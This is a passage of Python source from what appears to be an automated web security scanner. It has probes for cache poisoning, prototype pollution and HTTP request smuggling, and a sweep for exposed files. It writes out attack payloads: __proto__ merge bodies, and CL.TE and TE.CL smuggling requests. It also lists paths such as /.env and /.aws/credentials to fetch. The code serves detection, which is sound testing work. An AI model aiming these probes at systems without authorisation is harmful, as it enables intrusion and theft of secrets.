    strong = next((h for h in hits if h["marker"]
                   and h["marker"] != (base_err.group(0) if base_err else None)),
                  None)
    if strong:
        verdict = ("deserialization surface: parser error "
                   f"'{strong['marker']}' on {strong['name']} payload - "
                   "the field reaches a deserializer")
    elif any(h["marker"] for h in hits):
        verdict = "deserializer errors seen but also at baseline"
    else:
        verdict = "no deserialization signal"
    return {"verdict": verdict, "base_id": base["request_id"],
            "results": hits}


def probe_cache(ctx: Context, url: str) -> dict:
    """Cache-poisoning check: poison attempt via unkeyed X-Forwarded-Host,
    then a clean fetch - poisoned bytes served to the clean request means
    the header is unkeyed input into a shared cache."""
    c1, c2 = f"{_marker('cp')}.invalid", f"{_marker('cq')}.invalid"
    ctx.client.send("GET", url, headers={"X-Forwarded-Host": c1},
                    tool="probe_cache", note="poison attempt")
    clean = ctx.client.send("GET", url, tool="probe_cache",
                            note="clean fetch")
    refl = ctx.client.send("GET", url, headers={"X-Forwarded-Host": c2},
                           tool="probe_cache", note="reflection check")
    clean_body = clean.get("body") or ""
    refl_body = refl.get("body") or ""
    if c1 in clean_body:
        verdict = ("cache-poisoning candidate: unkeyed X-Forwarded-Host "
                   "persisted into a response served to a clean request")
    elif c2 in refl_body:
        verdict = ("X-Forwarded-Host reflected but not cached - header "
                   "is likely keyed or no shared cache")
    else:
        verdict = "no cache/xfh signal"
    return {"verdict": verdict, "clean_id": clean["request_id"],
            "reflect_id": refl["request_id"]}


def probe_ppoll(ctx: Context, pollute_url: str, check_url: str) -> dict:
    """Prototype-pollution check: POST a __proto__ merge payload to the
    mutating endpoint, then re-read a reflecting endpoint. A key that
    appears only after the merge is the signal."""
    canary = _marker("pp")
    before = ctx.client.send("GET", check_url, tool="probe_ppoll",
                             note="pre-merge baseline")
    poll = ctx.client.send(
        "POST", pollute_url,
        headers={"Content-Type": "application/json"},
        body=_json.dumps({"__proto__": {canary: "polluted"}}),
        tool="probe_ppoll", note="__proto__ merge")
    after = ctx.client.send("GET", check_url, tool="probe_ppoll",
                            note="post-merge read")
    polluted = (canary in (after.get("body") or "")
                and canary not in (before.get("body") or ""))
    if polluted:
        verdict = ("prototype-pollution candidate: __proto__ key merged "
                   "server-side and surfaced on a different object")
    elif canary in (poll.get("body") or ""):
        verdict = ("server echoes __proto__ input but no cross-object "
                   "pollution observed")
    else:
        verdict = "no prototype-pollution signal"
    return {"verdict": verdict, "before_id": before["request_id"],
            "pollute_id": poll["request_id"], "after_id": after["request_id"]}


# the 'G' byte must show up in the error to count as desync evidence -
# a generic "Bad Request" without the echoed bogus method proves nothing
_SMUGGLE_G = re.compile(r"G(GET|POST|PUT|HEAD|DELETE|OPTIONS|PATCH)\b|"
                        r"['\"( ]G[A-Z]{2,}['\")] ?|method '?G", re.I)


def _smuggle_pair(ctx: Context, url: str, ambiguous: dict,
                  note: str) -> list[dict]:
    r = ctx.client.send_raw(
        url,
        requests=[ambiguous, {"method": "GET", "headers": [], "body": b""}],
        tool="probe_smuggle", note=note)
    return r.get("sends") or []


def probe_smuggle(ctx: Context, url: str) -> dict:
    """HTTP request-smuggling detection - CL.TE and TE.CL variants.

    Each variant sends ONE ambiguous request (both Content-Length and
    Transfer-Encoding) on a connection, then a clean request behind it.
    If a front/back pair disagrees on framing, leftover bytes poison the
    SECOND request's method line - observed as a 4xx/5xx naming a bogus
    'G*' method. The stray bytes can only corrupt our own follow-up
    request, never a stranger's queue (the standard safe detection from
    the PortSwigger methodology)."""
    # CL.TE: front honors CL (6 bytes, all forwarded), back-end honors
    # chunked -> 'G' is left in the stream
    sends = _smuggle_pair(ctx, url, {
        "method": "POST",
        "headers": [["Content-Length", "6"],
                    ["Transfer-Encoding", "chunked"]],
        "body": b"0\r\n\r\nG"},
        note="CL.TE detect - 'G' may only poison our own next request")
    if len(sends) < 2:
        return {"verdict": "inconclusive: connection did not survive the "
                           "ambiguous request", "sends": sends}
    s1, s2 = sends[0], sends[1]
    if s2.get("error"):
        return {"verdict": "inconclusive: second request failed after the "
                           "ambiguous one - could be a desync or just a "
                           "dropped connection; retry manually",
                "ambiguous_id": s1["request_id"], "sends": sends}
    if s2["status"] >= 400 and _SMUGGLE_G.search(s2.get("body") or ""):
        return {"verdict": "cl.te desync candidate: the stray 'G' poisoned "
                           "the next request's method line - back-end parsed "
                           "chunked framing while the front-end forwarded "
                           "Content-Length bytes",
                "ambiguous_id": s1["request_id"],
                "check_id": s2["request_id"],
                "statuses": [s1["status"], s2["status"]]}
    # TE.CL: front honors chunked (whole body forwarded), back-end honors
    # CL (4 bytes) -> the smuggled 'GPOST /' prefix stays in the stream.
    # It is a complete request line, so the poisoned response arrives
    # WITHOUT a second send - reads=2 collects it.
    r2 = ctx.client.send_raw(
        url,
        requests=[{"method": "POST", "reads": 2,
                   "headers": [["Content-Length", "4"],
                               ["Transfer-Encoding", "chunked"]],
                   # '14' = 20-byte chunk holding the fake request line; a
                   # CL reader consumes only '14\r\n' and leaves 'GPOST /'
                   "body": b"14\r\nGPOST / HTTP/1.1\r\n\r\n\r\n0\r\n\r\n"}],
        tool="probe_smuggle",
        note="TE.CL detect - poisoned request answers on its own")
    sends2 = r2.get("sends") or []
    if len(sends2) < 2:
        return {"verdict": "inconclusive: TE.CL probe got no queued "
                           "response", "sends": sends + sends2}
    t1, t2 = sends2[0], sends2[1]
    if t2["status"] >= 400 and _SMUGGLE_G.search(t2.get("body") or ""):
        return {"verdict": "te.cl desync candidate: the smuggled 'GPOST' "
                           "request answered on its own - back-end honored "
                           "Content-Length while the front-end forwarded "
                           "chunked framing",
                "ambiguous_id": t1["request_id"],
                "check_id": t2["request_id"],
                "statuses": [s1["status"], s2["status"],
                             t1["status"], t2["status"]]}
    # TE-obfuscation variants of CL.TE: a strict front-end normalizes or
    # rejects a non-canonical TE and falls back to CL, while a lenient
    # back-end still parses chunked - a differential plain CL.TE cannot
    # expose. Same 'G' self-poison signal.
    obf_sends: list[dict] = []
    for obf in ("xchunked", "chunked "):
        sends3 = _smuggle_pair(ctx, url, {
            "method": "POST",
            "headers": [["Content-Length", "6"],
                        ["Transfer-Encoding", obf]],
            "body": b"0\r\n\r\nG"},
            note=f"CL.TE detect - obfuscated TE {obf!r}")
        obf_sends += sends3
        if len(sends3) < 2 or sends3[1].get("error"):
            continue
        o1, o2 = sends3
        if o2["status"] >= 400 and _SMUGGLE_G.search(o2.get("body") or ""):
            return {"verdict": "cl.te desync candidate (obfuscated TE "
                               f"{obf!r}): the stray 'G' poisoned the next "
                               "request's method line - front-end did not "
                               "honor the non-canonical TE while the "
                               "back-end still parsed chunked framing",
                    "ambiguous_id": o1["request_id"],
                    "check_id": o2["request_id"],
                    "statuses": [s1["status"], s2["status"],
                                 t1["status"], t2["status"],
                                 o1["status"], o2["status"]]}
    # the poisoned request is self-contained, so desync => an extra
    # response; nothing extra arriving means the framing agreed
    nothing_queued = bool(t2.get("error")) or t2["status"] == 0
    if (nothing_queued or t2["status"] < 400) and s2["status"] < 400:
        verdict = ("no desync signal: clean follow-up on all variants "
                   "(canonical and obfuscated TE) - back-end and front-end "
                   "likely agree on framing")
    else:
        verdict = ("inconclusive: follow-up rejected but without a 'G*' "
                   "method signature - manual review needed")
    return {"verdict": verdict,
            "statuses": [s1["status"], s2["status"],
                         t1["status"], t2["status"]],
            "note": "HTTP/2-downgrade and client-side desync are separate "
                    "classes - load_skill('request-smuggling')"}


_DISCLOSE_PATHS: list[tuple[str, re.Pattern]] = [
    ("/.git/HEAD", re.compile(r"^ref:\s|^[0-9a-f]{40}", re.M)),
    ("/.git/config", re.compile(r"\[core\]|\[remote", re.I)),
    ("/.env", re.compile(r"^[A-Z_]+=|DB_|SECRET|TOKEN|KEY=", re.M)),
    ("/.svn/entries", re.compile(r"dir|svn:entry", re.I)),
    ("/.DS_Store", re.compile(r"Bud1|\.localized", re.I)),
    ("/server-status", re.compile(r"Apache Status|Server uptime|scoreboard", re.I)),
    ("/actuator/env", re.compile(r'"propertySources"|"systemProperties"', re.I)),
    ("/actuator/heapdump", re.compile(r"JAVA PROFILE|HPROF", re.I)),
    ("/phpinfo.php", re.compile(r"phpinfo\(\)|PHP Version|php\.net", re.I)),
    ("/debug", re.compile(r"debug|traceback|environment|locals", re.I)),
    ("/elmah.axd", re.compile(r"Error Log for|ELMAH", re.I)),
    ("/WEB-INF/web.xml", re.compile(r"<web-app|servlet-class", re.I)),
    ("/trace", re.compile(r"TRACE /|HTTP/1\.1", re.I)),
    ("/backup.zip", re.compile(r"PK\x03\x04")),
    ("/wp-config.php~", re.compile(r"DB_PASSWORD|DB_NAME", re.I)),
    ("/swagger.json", re.compile(r'"swagger"\s*:\s*"|"openapi"\s*:', re.I)),
    ("/api-docs", re.compile(r'"swagger"|"openapi"|"paths"\s*:', re.I)),
    ("/metrics", re.compile(r"^# (HELP|TYPE)|_total \d|_seconds ", re.M)),
    ("/console", re.compile(r"Werkzeug|Interactive Console|TRACE", re.I)),
    ("/docker-compose.yml", re.compile(r"version:\s*['\"]|services:", re.I)),
    ("/.npmrc", re.compile(r"_auth|_authToken|registry=", re.I)),
    ("/.aws/credentials", re.compile(r"aws_access_key_id|aws_secret", re.I)),
    ("/health", re.compile(r'"status"\s*:\s*"(UP|ok|healthy|pass)"', re.I)),
]


def probe_disclosure(ctx: Context, url: str) -> dict:
    """Information-disclosure sweep: GET a curated list of commonly-
    exposed sensitive paths against the target's origin. A 200 whose body
    matches the artifact's own signature is a real exposure lead; a plain
    200 without the signature is usually a soft-404 and is not reported."""
    p = urllib.parse.urlparse(url)
    root = f"{p.scheme}://{p.netloc}"
    # baseline: a definitely-missing path shows the site's soft-404 shape
    base = ctx.client.send("GET", root + "/" + _marker("arg404"),
                           tool="probe_disclosure", note="soft-404 baseline")
    hits, checked = [], 0
    for rel, sig in _DISCLOSE_PATHS:
        r = ctx.client.send("GET", root + rel, tool="probe_disclosure",
                            note=f"sensitive path {rel}")
        checked += 1
        if r["status"] != 200:
            continue
        body = r.get("body") or ""
        if body == (base.get("body") or "") and body:
            continue  # identical to soft-404 - not a real artifact
        if sig.search(body):
            hits.append({"path": rel, "request_id": r["request_id"],
                         "bytes": len(body), "signature": sig.pattern[:40]})
    verdict = (f"{len(hits)} exposed sensitive path(s): "
               + ", ".join(h["path"] for h in hits) if hits
               else "no sensitive artifacts found")
    return {"verdict": verdict, "checked": checked, "exposed": hits,
            "note": "each hit already matched its artifact signature - "
                    "quote it verbatim when recording"}


def probe_websocket(ctx: Context, url: str) -> dict:
    """WebSocket discovery: RFC 6455 upgrade handshake. A 101 with
    Upgrade: websocket confirms a live ws channel - then test authz and
    message-level controls manually (raw ws framing is out of httpx's
    scope, so this probe stops at the handshake)."""
    import base64
    import os
    key = base64.b64encode(os.urandom(16)).decode()
    r = ctx.client.send(
        "GET", url,
        headers={"Upgrade": "websocket", "Connection": "Upgrade",
                 "Sec-WebSocket-Key": key, "Sec-WebSocket-Version": "13"},
        tool="probe_websocket", note="ws upgrade handshake")
    hdrs = {k.lower(): v for k, v in (r.get("headers") or {}).items()}
    upgrade = str(hdrs.get("upgrade", "")).lower()
    accept = hdrs.get("sec-websocket-accept", "")
    if r["status"] == 101 and "websocket" in upgrade:
        # verify the accept token: a broken server may 101 without
        # completing the RFC 6455 challenge - worth noting either way
        import hashlib
        want = base64.b64encode(hashlib.sha1(
            (key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").encode()
        ).digest()).decode()
        if accept and accept != want:
            verdict = ("websocket 101 received but Sec-WebSocket-Accept is "
                       "WRONG - handshake not RFC-compliant; the endpoint "
                       "may be a mock or middleware, probe manually")
        else:
            verdict = ("websocket endpoint confirmed (101 + valid accept) "
                       "- channel is open; test per-message authorization "
                       "and input handling with a ws client")
    elif r["status"] in (400, 426):
        verdict = f"upgrade refused (HTTP {r['status']}) - endpoint may not be ws"
    elif r["status"] == 200:
        verdict = ("no ws upgrade: plain 200 - endpoint ignores the "
                   "handshake headers")
    else:
        verdict = f"no ws signal (HTTP {r['status']})"
    out = {"verdict": verdict, "request_id": r["request_id"],
           "status": r["status"]}
    if accept:
        out["accept_token"] = accept
    return out
